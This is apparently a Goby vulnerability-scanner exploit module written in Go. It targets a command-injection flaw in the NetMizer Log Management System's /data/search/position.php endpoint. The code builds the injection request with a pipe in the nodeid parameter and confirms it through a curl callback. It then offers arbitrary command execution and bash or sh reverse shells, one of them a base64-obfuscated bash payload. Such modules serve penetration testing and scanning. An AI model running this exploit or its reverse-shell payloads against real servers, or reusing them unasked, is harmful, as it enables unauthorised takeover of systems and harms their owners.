package exploits

import (
	"encoding/base64"
	"errors"
	"net/url"
	"strings"
	"time"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "NetMizer Log Management System /data/search/position.php Command Execution Vulnerability",
    "Description": "<p>The NetMizer Log Management System is a plug-in system that works with NetMizer traffic management equipment, a global provider of integrated application delivery and application security solutions for business intelligence networks. It provides global enterprises and operators with solutions that ensure full availability, high performance and complete security for business-critical applications. Command execution vulnerability exists at the position.php interface of the NetMizer log management system. Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "NetMizer-Log-MS",
    "Homepage": "http://www.lingzhou.com.cn",
    "DisclosureDate": "2024-07-16",
    "PostTime": "2024-07-17",
    "Author": "1977250845@qq.com",
    "FofaQuery": "title=\"NetMizer\" && body=\"NetMizer\"",
    "GobyQuery": "title=\"NetMizer\" && body=\"NetMizer\"",
    "Level": "3",
    "Impact": "<p>Command execution vulnerability exists at the position.php interface of the NetMizer log management system. Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>Update to the latest version.</p>",
    "References": [
        "https://blog.csdn.net/qq_56698744/article/details/139320608"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByBashBase64,ByBash,BySh",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/data/search/position.php",
                "follow_redirect": true,
                "header": {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.5",
    "Translation": {
        "CN": {
            "Name": "NetMizer 日志管理系统 /data/search/position.php 命令执行漏洞",
            "Product": "NetMizer-日志管理系统",
            "Description": "<p>NetMizer日志管理系统是一个与NetMizer流量管理设备配合使用的外挂系统，NetMizer是提供集成应用交付和应用安全解决方案以实现业务智能网络的全球供应商。它为全球企业和运营商提供确保关键业务应用的全面可用性、高性能和完善的安全性的解决方案。NetMizer 日志管理系统position.php接口处存在命令执行漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行命令，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>及时更新到最新版本<br></p>",
            "Impact": "<p>NetMizer 日志管理系统hostdelay.php接口处存在命令执行漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行命令，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "NetMizer Log Management System /data/search/position.php Command Execution Vulnerability",
            "Product": "NetMizer-Log-MS",
            "Description": "<p>The NetMizer Log Management System is a plug-in system that works with NetMizer traffic management equipment, a global provider of integrated application delivery and application security solutions for business intelligence networks. It provides global enterprises and operators with solutions that ensure full availability, high performance and complete security for business-critical applications. Command execution vulnerability exists at the&nbsp;position.php interface of the NetMizer log management system. Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "Recommendation": "<p>Update to the latest version.<br></p>",
            "Impact": "<p>Command execution vulnerability exists at the&nbsp;position.php interface of the NetMizer log management system. Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10972"
}`

	setPayloadRequestHashCWIVWG892FGVESVDBCIWUD := func(hostInfo *httpclient.FixUrl, command string) (ok bool, vulURL string, err error) {
		//请注意：command字段是原始的命令，如果漏洞利用需要对命令进行编码，则需在此处编码
		//请注意：ok值为，true代表命令执行成功，false代表命令执行失败
		//请注意：vulURL 字段为检测后显示的风险路径，示例值为：/path/to/vulable.jsp
		//对command进行url编码
		command = url.QueryEscape(command)
		//漏洞url地址
		vulUrl := "/data/search/position.php"
		pocurl := vulUrl + "?action=file&nodeid=|" + command
		commandResult := ""
		makeRequest := httpclient.NewGetRequestConfig(pocurl)
		makeRequest.VerifyTls = false
		makeRequest.Timeout = 10
		makeRequest.FollowRedirect = false
		makeRequest.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
		makeRequest.Header.Store("Accept-Encoding", "gzip, deflate")
		if resp, err := httpclient.DoHttpRequest(hostInfo, makeRequest); err == nil {
			commandResult = resp.RawBody
			if strings.Contains(commandResult, "\"success\":\"success\"") {
				return true, vulUrl, nil
			} else if strings.Contains(commandResult, "false") {
				return false, vulUrl, nil
			}
			return true, vulUrl, nil
		} else {
			return false, vulUrl, nil
		}

	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//请注意：在此处将setPayloadRequestHash0001函数赋值给runPayload
			runPayload := setPayloadRequestHashCWIVWG892FGVESVDBCIWUD

			//请注意：后续代码为模板代码，非特殊情况，无需更改
			checkStr := goutils.RandomHexString(6)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)

			//请注意：若漏洞环境特殊，可自行修改为wget、或其他能够出发HTTPLog的命令，由于部分godserver没有域名，所以尽量使用HTTPLog的方式
			pocCommand := "curl " + checkUrl
			ok, vulUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil || !ok {
				return false
			}
			if godclient.PullExists(checkStr, time.Second*15) {
				ss.VulURL = hostInfo.FixedHostInfo + vulUrl
				return true
			}

			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//请注意：在此处将setPayloadRequestHash0001函数赋值给runPayload
			runPayload := setPayloadRequestHashCWIVWG892FGVESVDBCIWUD

			//请注意：后续代码为模板代码，非特殊情况，无需更改
			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":       godclient.ReverseTCPByBash,
					"ByBashBase64": godclient.ReverseTCPByBash,
					"BySh":         godclient.ReverseTCPBySh,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
					command := typeList[reverseType](rp)
					if reverseType == "ByBashBase64" {
						command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
					}
					return command, waitSessionCh, nil
				}

				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				ok, _, err := runPayload(expResult.HostInfo, command)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				if !ok {
					expResult.Success = false
					expResult.Output = "执行失败"
				}
				expResult.Success = true
				expResult.Output = "执行成功,该漏洞无回显,请自行判断执行效果"
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])
				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
